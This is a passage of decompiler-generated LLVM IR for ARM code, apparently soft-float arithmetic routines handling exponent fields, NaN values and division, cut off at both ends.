  uselistorder i32 %v4_15208, { 2, 1, 0 }
  uselistorder i32 %v2_15204, { 1, 0, 2 }
  uselistorder i32 %v1_151e8, { 2, 0, 1 }
  uselistorder i32 %v0_151e4, { 1, 0 }
  uselistorder i1 %v7_151d8, { 1, 0 }
  uselistorder i1 %v1_151b8, { 1, 0 }
  uselistorder i32 %v6_151b0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_151b8, { 1, 0, 2 }
  uselistorder i32 %v3_15198, { 1, 0, 2 }
  uselistorder i32 %v5_15194, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_15194, { 1, 0 }
  uselistorder i1 %v3_1518c, { 1, 0 }
  uselistorder i32 %v5_15180, { 1, 0, 2, 3 }
  uselistorder i32 %v3_15180, { 1, 0 }
  uselistorder i1 %v3_15178, { 1, 0 }
  uselistorder i32 %v2_15178, { 1, 0, 2 }
  uselistorder i32 %v5_1516c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1516c, { 1, 0 }
  uselistorder i1 %v3_15164, { 1, 0 }
  uselistorder i32 %v2_15164, { 1, 0, 2 }
  uselistorder i32 %v5_15158, { 2, 1, 0 }
  uselistorder i32 %v2_15154, { 1, 2, 0 }
  uselistorder i32 %v2_15144, { 0, 2, 1 }
  uselistorder i32 %v5_1513c, { 1, 0 }
  uselistorder i32 %v2_15138, { 1, 2, 0 }
  uselistorder i32 %v2_1512c, { 1, 0, 2 }
  uselistorder i32 %v2_15120, { 1, 0, 2 }
  uselistorder i32 %v2_15110, { 1, 0, 2 }
  uselistorder i32 %v2_15104, { 0, 2, 1 }
  uselistorder i32 %v2_150f4, { 1, 0, 2 }
  uselistorder i32 %v6_150ec, { 1, 0, 2, 3 }
  uselistorder i32 %v6_150e8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_150e0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_150dc, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_150d8, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_150d4, { 3, 2, 0, 1 }
  uselistorder i32 %v3_150d0, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_150c0, { 1, 0, 2 }
  uselistorder i32 %v1_150bc, { 1, 0, 2 }
  uselistorder i32 %v6_150b0, { 0, 2, 1, 3 }
  uselistorder i32 %v6_150ac, { 0, 2, 1, 3 }
  uselistorder i32 %v1_150ac, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_150a8, { 1, 0 }
  uselistorder i32 %v2_150a4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_15094, { 2, 1, 0 }
  uselistorder i32 %v5_15090, { 2, 1, 0 }
  uselistorder i32 %v9_15084, { 1, 0 }
  uselistorder i32 %v6_15084, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 5, 6, 7, 8, 9, 10, 11, 12, 4, 3, 2, 1, 0, 13 }
  uselistorder i32 65536, { 2, 0, 3, 65, 4, 66, 1, 5, 6, 7, 8, 67, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 30, 26, 31, 27, 32, 28, 33, 29, 34, 35, 36, 40, 37, 41, 38, 42, 39, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 68 }
  uselistorder i32* @sl, { 53, 54, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 3, 4, 20, 21, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 55, 56, 57, 58, 2, 59, 60, 61, 62, 63, 64, 65, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 5, 66, 67, 68, 69, 70, 71, 72, 1, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i32* @sb, { 31, 32, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 16, 17, 18, 19, 20, 21, 22, 23, 24, 33, 34, 35, 36, 37, 38, 39, 40, 41, 25, 26, 27, 28, 29, 30, 42, 43, 44, 45, 46, 47, 0, 48, 3 }
  uselistorder i32* @r8, { 33, 34, 8, 9, 10, 11, 12, 13, 14, 3, 4, 5, 15, 16, 17, 0, 18, 19, 20, 21, 22, 1, 23, 24, 25, 26, 35, 36, 37, 38, 39, 40, 41, 42, 92, 93, 53, 27, 28, 29, 30, 31, 32, 43, 44, 45, 46, 47, 48, 6, 7, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 2, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 49, 50, 51, 52, 88, 89, 90, 91 }
  uselistorder i32* @r7, { 63, 64, 23, 25, 26, 24, 27, 28, 29, 30, 31, 32, 7, 8, 9, 10, 11, 12, 13, 1, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 14, 15, 65, 66, 67, 68, 69, 70, 3, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 111, 16, 17, 2, 18, 19, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 81, 82, 83, 84, 100, 4, 101, 102, 5, 6, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 0, 20, 21, 109, 110, 22, 96, 97, 98, 99, 103, 104, 105, 106, 107, 108 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_151f8, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_151c4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_15224(i32 %arg1) local_unnamed_addr {
dec_label_pc_15224:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_15224 = load i1, i1* @cpsr_z, align 1
  %v1_15224 = load i1, i1* @cpsr_n, align 1
  %v2_15224 = load i1, i1* @cpsr_v, align 1
  %v3_15224 = xor i1 %v1_15224, %v2_15224
  %v4_15224 = or i1 %v0_15224, %v3_15224
  br i1 %v4_15224, label %dec_label_pc_15228, label %dec_label_pc_1538c

dec_label_pc_15228:                               ; preds = %dec_label_pc_15224
  %v0_15228 = load i32, i32* @r4, align 4
  %v4_15228 = add i32 %v0_15228, 54
  %v6_15228 = sub i32 0, %v0_15228
  %v7_15228 = and i32 %v4_15228, %v6_15228
  %v8_15228 = icmp slt i32 %v7_15228, 0
  store i1 %v8_15228, i1* @cpsr_v, align 1
  %v9_15228 = icmp slt i32 %v4_15228, 0
  store i1 %v9_15228, i1* @cpsr_n, align 1
  %v10_15228 = icmp eq i32 %v4_15228, 0
  store i1 %v10_15228, i1* @cpsr_z, align 1
  %v7_1522c = icmp sgt i32 %v0_15228, -54
  br i1 %v7_1522c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15228
  store i32 0, i32* @r1, align 4
  %v8_15230 = load i32, i32* %r0.global-to-local, align 4
  %v9_15230 = and i32 %v8_15230, -2147483648
  store i32 %v9_15230, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_15230

bb6:                                              ; preds = %dec_label_pc_15228
  %v1_15238 = sub i32 0, %v0_15228
  %v2_1523c = sub i32 -32, %v0_15228
  %v4_1523c = add i32 %v0_15228, 31
  %v5_1523c = and i32 %v4_1523c, %v1_15238
  %v6_1523c = icmp slt i32 %v5_1523c, 0
  store i1 %v6_1523c, i1* @cpsr_v, align 1
  %v6_15240 = icmp slt i32 %v1_15238, 32
  br i1 %v6_15240, label %dec_label_pc_15244, label %dec_label_pc_152a8

dec_label_pc_15244:                               ; preds = %bb6
  %v1_15244 = add i32 %v2_1523c, 12
  %v8_15248 = icmp sgt i32 %v1_15244, 0
  br i1 %v8_15248, label %dec_label_pc_1527c, label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %dec_label_pc_15244
  %v1_1524c = add i32 %v2_1523c, 32
  %v1_15250 = sub i32 0, %v2_1523c
  %v0_15254 = load i32, i32* @r1, align 4
  %v6_15254 = shl i32 %v0_15254, %v1_15250
  %v2_15258 = add i32 %v2_1523c, 31
  %v3_15258 = shl i32 1, %v2_15258
  %v6_15258 = lshr i32 %v0_15254, %v1_1524c
  %v1_1525c = load i32, i32* %r0.global-to-local, align 4
  %v7_1525c = shl i32 %v1_1525c, %v1_15250
  %v8_1525c = or i32 %v7_1525c, %v6_15258
  %v1_15260 = and i32 %v1_1525c, -2147483648
  %tmp = bitcast i32 %v1_1525c to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_15264 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_15254, 0
  %v4_15268 = zext i1 %tmp14 to i32
  %v5_15268 = add i32 %v8_1525c, %v4_15268
  store i32 %v5_15268, i32* @r1, align 4
  %v5_1526c = and i32 %v1_15264, %v3_15258
  %v6_1526c = icmp ne i32 %v5_1526c, 0
  %v7_1526c = lshr i32 %v1_15264, %v1_1524c
  %v9_1526c = add i32 %v7_1526c, %v1_15260
  %v10_1526c = zext i1 %v6_1526c to i32
  %v11_1526c = add i32 %v9_1526c, %v10_1526c
  store i32 %v11_1526c, i32* %r0.global-to-local, align 4
  %v19_1526c = add i32 %v11_1526c, %v10_1526c
  %v20_1526c = xor i32 %v19_1526c, %v1_1525c
  %v21_1526c = xor i32 %v19_1526c, %v7_1526c
  %v22_1526c = and i32 %v20_1526c, %v21_1526c
  %v23_1526c = icmp slt i32 %v22_1526c, 0
  store i1 %v23_1526c, i1* @cpsr_v, align 1
  %v0_15270 = load i32, i32* @lr, align 4
  %v3_15270 = mul i32 %v6_15254, 2
  %v4_15270 = or i32 %v0_15270, %v3_15270
  %v5_15270 = icmp slt i32 %v4_15270, 0
  store i1 %v5_15270, i1* @cpsr_n, align 1
  %v6_15270 = icmp eq i32 %v4_15270, 0
  store i1 %v6_15270, i1* @cpsr_z, align 1
  br i1 %v6_15270, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_1524c
  %tmp15 = sext i1 %tmp14 to i32
  %v6_15274 = add nsw i32 %tmp15, -1
  %v7_15274 = and i32 %v5_15268, %v6_15274
  store i32 %v7_15274, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1524c, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_1526c

dec_label_pc_1527c:                               ; preds = %dec_label_pc_15244
  %v1_1527c = sub i32 0, %v2_1523c
  %v1_15280 = add i32 %v2_1523c, 32
  %v0_15284 = load i32, i32* @r1, align 4
  %v6_15284 = shl i32 %v0_15284, %v1_1527c
  %v6_15288 = lshr i32 %v0_15284, %v1_15280
  %v1_1528c = load i32, i32* %r0.global-to-local, align 4
  %v7_1528c = shl i32 %v1_1528c, %v1_1527c
  %v8_1528c = or i32 %v7_1528c, %v6_15288
  %v1_15290 = and i32 %v1_1528c, -2147483648
  %tmp16 = icmp slt i32 %v6_15284, 0
  %v4_15294 = zext i1 %tmp16 to i32
  %v5_15294 = add i32 %v8_1528c, %v4_15294
  store i32 %v5_15294, i32* @r1, align 4
  %v6_15294 = icmp ult i32 %v5_15294, %v8_1528c
  %v2_15298 = zext i1 %v6_15294 to i32
  %v3_15298 = or i32 %v2_15298, %v1_15290
  store i32 %v3_15298, i32* %r0.global-to-local, align 4
  %v9_15298 = add nsw i32 %v3_15298, %v2_15298
  %v10_15298 = sub i32 0, %v1_1528c
  %v11_15298 = and i32 %v9_15298, %v10_15298
  %v12_15298 = icmp slt i32 %v11_15298, 0
  store i1 %v12_15298, i1* @cpsr_v, align 1
  %v0_1529c = load i32, i32* @lr, align 4
  %v3_1529c = mul i32 %v6_15284, 2
  %v4_1529c = or i32 %v0_1529c, %v3_1529c
  %v5_1529c = icmp slt i32 %v4_1529c, 0
  store i1 %v5_1529c, i1* @cpsr_n, align 1
  %v6_1529c = icmp eq i32 %v4_1529c, 0
  store i1 %v6_1529c, i1* @cpsr_z, align 1
  br i1 %v6_1529c, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1527c
  %tmp17 = sext i1 %tmp16 to i32
  %v6_152a0 = add nsw i32 %tmp17, -1
  %v7_152a0 = and i32 %v5_15294, %v6_152a0
  store i32 %v7_152a0, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1527c, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_15298

dec_label_pc_152a8:                               ; preds = %bb6
  %v1_152a8 = sub i32 32, %v2_1523c
  %v0_152ac = load i32, i32* @lr, align 4
  %v1_152ac = load i32, i32* @r1, align 4
  %v7_152ac = shl i32 %v1_152ac, %v1_152a8
  %v8_152ac = or i32 %v7_152ac, %v0_152ac
  %v6_152b0 = lshr i32 %v1_152ac, %v2_1523c
  %v1_152b4 = load i32, i32* %r0.global-to-local, align 4
  %v7_152b4 = shl i32 %v1_152b4, %v1_152a8
  %v8_152b4 = or i32 %v7_152b4, %v6_152b0
  %v6_152b8 = lshr i32 %v1_152b4, %v2_1523c
  %v1_152bc = and i32 %v1_152b4, -2147483648
  store i32 %v1_152bc, i32* %r0.global-to-local, align 4
  %v7_152c0 = lshr i32 %v1_152bc, %v2_1523c
  %v8_152c0 = sub i32 -1, %v7_152c0
  %v9_152c0 = and i32 %v6_152b8, %v8_152c0
  %tmp18 = icmp slt i32 %v8_152b4, 0
  %v4_152c4 = zext i1 %tmp18 to i32
  %v5_152c4 = add i32 %v4_152c4, %v9_152c0
  store i32 %v5_152c4, i32* @r1, align 4
  %v3_152c8 = mul i32 %v8_152b4, 2
  %v4_152c8 = or i32 %v8_152ac, %v3_152c8
  %v5_152c8 = icmp slt i32 %v4_152c8, 0
  store i1 %v5_152c8, i1* @cpsr_n, align 1
  %v6_152c8 = icmp eq i32 %v4_152c8, 0
  store i1 %v6_152c8, i1* @cpsr_z, align 1
  br i1 %v6_152c8, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_152a8
  %tmp19 = sext i1 %tmp18 to i32
  %v6_152cc = add nsw i32 %tmp19, -1
  %v7_152cc = and i32 %v5_152c4, %v6_152cc
  store i32 %v7_152cc, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_152a8, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_152bc

dec_label_pc_1538c:                               ; preds = %dec_label_pc_15224
  %v0_1538c = load i32, i32* %r0.global-to-local, align 4
  %v1_1538c = and i32 %v0_1538c, -2147483648
  %v1_15394 = or i32 %v1_1538c, 2146435072
  store i32 %v1_15394, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_15394

; uselistorder directives
  uselistorder i32 %v3_15298, { 2, 0, 1 }
  uselistorder i32 %v8_1528c, { 1, 0 }
  uselistorder i32 %v1_1527c, { 1, 0 }
  uselistorder i32 %v11_1526c, { 1, 0, 2 }
  uselistorder i32 %v1_1525c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15250, { 1, 0 }
  uselistorder i32 %v2_1523c, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_15238, { 1, 0 }
  uselistorder i32 %v4_15228, { 1, 2, 0 }
  uselistorder i32 %v0_15228, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 38, 39, 26, 27, 28, 0, 29, 5, 30, 16, 9, 10, 3, 31, 11, 7, 63, 64, 65, 66, 67, 68, 8, 69, 70, 71, 72, 73, 74, 12, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 13, 17, 21, 62, 54, 55, 56, 1, 57, 6, 58, 2, 59, 14, 32, 33, 34, 35, 75, 4, 36, 53, 60, 61, 15, 20, 18, 19, 22, 23, 24, 25, 37 }
  uselistorder i32 -32, { 2, 1, 3, 4, 5, 6, 10, 7, 11, 12, 8, 0, 9 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_153a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_153a0:
  %v1_153a4 = or i32 %arg1, 2146959360
  store i32 %arg2, i32* @r4, align 4
  ret i32 %v1_153a4
}

define i32 @function_153ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_153ac:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_153ac = load i32, i32* @r4, align 4
  store i32 %v3_153ac, i32* %stack_var_-16, align 4
  %v6_153ac = load i32, i32* @r5, align 4
  %v9_153ac = load i32, i32* @r6, align 4
  store i32 2047, i32* @ip, align 4
  %v1_153b8 = load i32, i32* %r0.global-to-local, align 4
  %v4_153b8 = udiv i32 %v1_153b8, 1048576
  %v5_153b8 = urem i32 %v4_153b8, 2048
  store i32 %v5_153b8, i32* @r4, align 4
  %v6_153b8 = icmp eq i32 %v5_153b8, 0
  br i1 %v6_153b8, label %dec_label_pc_153ac..thread2_crit_edge, label %bb

dec_label_pc_153ac..thread2_crit_edge:            ; preds = %dec_label_pc_153ac
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %dec_label_pc_153ac
  %v5_153bc = udiv i32 %arg3, 1048576
  %v6_153bc = urem i32 %v5_153bc, 2048
  store i32 %v6_153bc, i32* %r5.global-to-local, align 4
  %v7_153bc = icmp eq i32 %v6_153bc, 0
  br i1 %v7_153bc, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_15540

bb92:                                             ; preds = %bb
  %v5_153c0 = icmp eq i32 %v5_153b8, 2047
  br i1 %v5_153c0, label %.thread2, label %bb93

.thread2:                                         ; preds = %dec_label_pc_153ac..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %dec_label_pc_153ac..thread2_crit_edge ], [ %v5_153bc, %bb92 ]
  br label %dec_label_pc_15540

bb93:                                             ; preds = %bb92
  %v5_153c4 = icmp eq i32 %v6_153bc, 2047
  br i1 %v5_153c4, label %dec_label_pc_15540, label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %bb93
  %v2_153cc = sub nsw i32 %v5_153b8, %v6_153bc
  store i32 %v2_153cc, i32* %r4.global-to-local, align 4
  %v2_153d0 = xor i32 %v1_153b8, %arg3
  %v4_153d4 = mul i32 %arg3, 4096
  %v5_153d4 = or i32 %v4_153d4, %arg4
  store i32 %v5_153d4, i32* %r5.global-to-local, align 4
  %v7_153d4 = icmp eq i32 %v5_153d4, 0
  %v3_153d8 = mul i32 %v1_153b8, 4096
  store i32 %v3_153d8, i32* %r0.global-to-local, align 4
  br i1 %v7_153d4, label %dec_label_pc_15510, label %dec_label_pc_153e0

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153cc
  %tmp94 = mul i32 %arg3, 256
  %v4_153e8 = and i32 %tmp94, 268435200
  %v4_153ec = udiv i32 %arg4, 16777216
  %v5_153e8 = or i32 %v4_153ec, %v4_153e8
  %v5_153ec = or i32 %v5_153e8, 268435456
  store i32 %v5_153ec, i32* %r2.global-to-local, align 4
  %v3_153f0 = mul i32 %arg4, 256
  store i32 %v3_153f0, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_153b8, 256
  %v4_153f4 = and i32 %tmp95, 268435200
  %v1_153f8 = load i32, i32* @r1, align 4
  %v4_153f8 = udiv i32 %v1_153f8, 16777216
  %v5_153f4 = or i32 %v4_153f4, %v4_153f8
  %v5_153f8 = or i32 %v5_153f4, 268435456
  store i32 %v5_153f8, i32* %r5.global-to-local, align 4
  %v3_153fc = mul i32 %v1_153f8, 256
  store i32 %v3_153fc, i32* %r6.global-to-local, align 4
  %v1_15400 = and i32 %v2_153d0, -2147483648
  store i32 %v1_15400, i32* %r0.global-to-local, align 4
  %v3_15404 = icmp uge i32 %v5_153f8, %v5_153ec
  %v9_15404 = icmp eq i32 %v5_153f8, %v5_153ec
  br i1 %v9_15404, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_153e0
  %v4_15408 = icmp uge i32 %v3_153fc, %v3_153f0
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_153e0, %bb96
  %v1_1540c = phi i1 [ %v3_15404, %dec_label_pc_153e0 ], [ %v4_15408, %bb96 ]
  %v2_1540c = add nsw i32 %v2_153cc, 253
  %v3_1540c = zext i1 %v1_1540c to i32
  %v4_1540c = add nsw i32 %v2_1540c, %v3_1540c
  %v8_1540c = icmp ule i32 %v4_1540c, %v2_153cc
  %v9_1540c = icmp ugt i32 %v2_153cc, -254
  %v10_1540c = select i1 %v1_1540c, i1 %v8_1540c, i1 %v9_1540c
  %v1_15410 = add nsw i32 %v4_1540c, 768
  store i32 %v1_15410, i32* %r4.global-to-local, align 4
  br i1 %v10_1540c, label %dec_label_pc_15420, label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %bb97
  %v3_15418 = udiv i32 %v5_153ec, 2
  store i32 %v3_15418, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15420

dec_label_pc_15420:                               ; preds = %bb97, %dec_label_pc_15418
  %v0_15428 = phi i32 [ %v5_153ec, %bb97 ], [ %v3_15418, %dec_label_pc_15418 ]
  %v0_1542c = phi i32 [ %v3_153f0, %bb97 ], [ 0, %dec_label_pc_15418 ]
  %v2_15420 = sub i32 %v3_153fc, %v0_1542c
  store i32 %v2_15420, i32* %r6.global-to-local, align 4
  %v3_15420 = icmp uge i32 %v3_153fc, %v0_1542c
  %v3_15424 = icmp eq i1 %v3_15420, false
  %v4_15424 = sub nsw i32 %v5_153f8, %v0_15428
  %v6_15424 = sext i1 %v3_15424 to i32
  %v7_15424 = add nsw i32 %v6_15424, %v4_15424
  store i32 %v7_15424, i32* %r5.global-to-local, align 4
  %v3_15428 = udiv i32 %v0_15428, 2
  store i32 %v3_15428, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15438.outer

dec_label_pc_15438.outer:                         ; preds = %dec_label_pc_154d0, %dec_label_pc_15420
  %v1_154e4.ph = phi i32 [ %v2_154d0, %dec_label_pc_154d0 ], [ %v1_15400, %dec_label_pc_15420 ]
  %v0_1543c.ph = phi i32 [ %v5_154ac, %dec_label_pc_154d0 ], [ %v7_15424, %dec_label_pc_15420 ]
  %v1_15440.ph = phi i32 [ %v3_154b0, %dec_label_pc_154d0 ], [ %v2_15420, %dec_label_pc_15420 ]
  %v5_154b817.ph = phi i32 [ %v5_154b8, %dec_label_pc_154d0 ], [ %v3_15428, %dec_label_pc_15420 ]
  %v3_154bc13.ph = phi i32 [ %v3_154bc, %dec_label_pc_154d0 ], [ 0, %dec_label_pc_15420 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_154d0 ], [ 1048576, %dec_label_pc_15420 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_154d0 ], [ 524288, %dec_label_pc_15420 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %dec_label_pc_15438.outer, %dec_label_pc_154a8
  %v1_1549c59 = phi i32 [ %v2_154e4, %dec_label_pc_154a8 ], [ %storemerge136, %dec_label_pc_15438.outer ]
  %v1_15448 = phi i32 [ %v1_1544832, %dec_label_pc_154a8 ], [ %storemerge136, %dec_label_pc_15438.outer ]
  %v1_1546441 = phi i32 [ %v1_1546443, %dec_label_pc_154a8 ], [ %storemerge136, %dec_label_pc_15438.outer ]
  %v1_1548050 = phi i32 [ %v1_1548052, %dec_label_pc_154a8 ], [ %storemerge136, %dec_label_pc_15438.outer ]
  %v0_154c0 = phi i32 [ %v3_154c0, %dec_label_pc_154a8 ], [ %storemerge, %dec_label_pc_15438.outer ]
  %v0_1543c = phi i32 [ %v5_154ac, %dec_label_pc_154a8 ], [ %v0_1543c.ph, %dec_label_pc_15438.outer ]
  %v1_15440 = phi i32 [ %v3_154b0, %dec_label_pc_154a8 ], [ %v1_15440.ph, %dec_label_pc_15438.outer ]
  %v5_154b817 = phi i32 [ %v5_154b8, %dec_label_pc_154a8 ], [ %v5_154b817.ph, %dec_label_pc_15438.outer ]
  %v3_154bc13 = phi i32 [ %v3_154bc, %dec_label_pc_154a8 ], [ %v3_154bc13.ph, %dec_label_pc_15438.outer ]
  %v3_15438 = icmp uge i32 %v1_15440, %v3_154bc13
  %v3_1543c = icmp eq i1 %v3_15438, false
  %v4_1543c = sub i32 %v0_1543c, %v5_154b817
  %v6_1543c = sext i1 %v3_1543c to i32
  %v7_1543c = add i32 %v6_1543c, %v4_1543c
  %v8_1543c = zext i1 %v3_1543c to i32
  %v9_1543c = sub i32 %v7_1543c, %v8_1543c
  %v10_1543c = icmp ult i32 %v0_1543c, %v9_1543c
  %v11_1543c = icmp ne i32 %v5_154b817, -1
  %v12_1543c = or i1 %v11_1543c, %v10_1543c
  %v13_1543c = icmp ult i32 %v0_1543c, %v5_154b817
  %v14_1543c = select i1 %v3_1543c, i1 %v12_1543c, i1 %v13_1543c
  br i1 %v14_1543c, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_15438
  %v3_15440 = sub i32 %v1_15440, %v3_154bc13
  store i32 %v3_15440, i32* %r6.global-to-local, align 4
  store i32 %v7_1543c, i32* %r5.global-to-local, align 4
  %v3_15448 = or i32 %v1_15448, %v0_154c0
  store i32 %v3_15448, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15438, %bb98
  %v1_1549c58 = phi i32 [ %v1_1549c59, %dec_label_pc_15438 ], [ %v3_15448, %bb98 ]
  %v1_1544835 = phi i32 [ %v1_15448, %dec_label_pc_15438 ], [ %v3_15448, %bb98 ]
  %v1_15464 = phi i32 [ %v1_1546441, %dec_label_pc_15438 ], [ %v3_15448, %bb98 ]
  %v1_1548049 = phi i32 [ %v1_1548050, %dec_label_pc_15438 ], [ %v3_15448, %bb98 ]
  %v0_15458 = phi i32 [ %v0_1543c, %dec_label_pc_15438 ], [ %v7_1543c, %bb98 ]
  %v1_1545c = phi i32 [ %v1_15440, %dec_label_pc_15438 ], [ %v3_15440, %bb98 ]
  %v1_1544c = urem i32 %v5_154b817, 2
  %v2_1544c = icmp ne i32 %v1_1544c, 0
  %v3_1544c = udiv i32 %v5_154b817, 2
  %v3_15450 = zext i1 %v2_1544c to i32
  %v6_15450 = zext i32 %v3_154bc13 to i64
  %v7_15450 = sub i32 33, %v3_154bc13
  %v8_15450 = zext i32 %v7_15450 to i64
  %v9_15450 = shl i64 %v6_15450, %v8_15450
  %v10_15450 = sub i32 32, %v3_154bc13
  %v11_15450 = shl i32 %v3_15450, %v10_15450
  %v12_15450 = zext i32 %v11_15450 to i64
  %v14_15450 = or i64 %v12_15450, %v9_15450
  %v15_15450 = trunc i64 %v14_15450 to i32
  %v3_15454 = icmp uge i32 %v1_1545c, %v15_15450
  %v3_15458 = icmp eq i1 %v3_15454, false
  %v4_15458 = sub i32 %v0_15458, %v3_1544c
  %v6_15458 = sext i1 %v3_15458 to i32
  %v7_15458 = add i32 %v6_15458, %v4_15458
  %v13_15458 = icmp ult i32 %v0_15458, %v3_1544c
  %v14_15458 = or i1 %v13_15458, %v3_15458
  br i1 %v14_15458, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_1545c = sub i32 %v1_1545c, %v15_15450
  store i32 %v3_1545c, i32* %r6.global-to-local, align 4
  store i32 %v7_15458, i32* %r5.global-to-local, align 4
